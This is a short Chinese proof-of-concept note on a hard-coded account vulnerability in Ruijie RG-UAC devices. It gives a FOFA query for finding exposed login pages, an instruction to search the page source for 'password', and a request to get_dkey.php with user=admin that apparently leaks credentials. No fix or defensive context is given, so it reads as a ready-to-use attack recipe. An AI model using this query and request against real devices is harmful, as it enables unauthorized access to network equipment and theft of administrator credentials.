# 锐捷RG-UAC 账户硬编码漏洞

fofa：

title="RG-UAC登录页面"

**PoC1：**

登录页面直接查看源代码，搜索：password

**PoC2:**

```
https://127.0.0.1/get_dkey.php?user=admin
```

ref：
https://forum.ywhack.com/thread-114977-1-2.html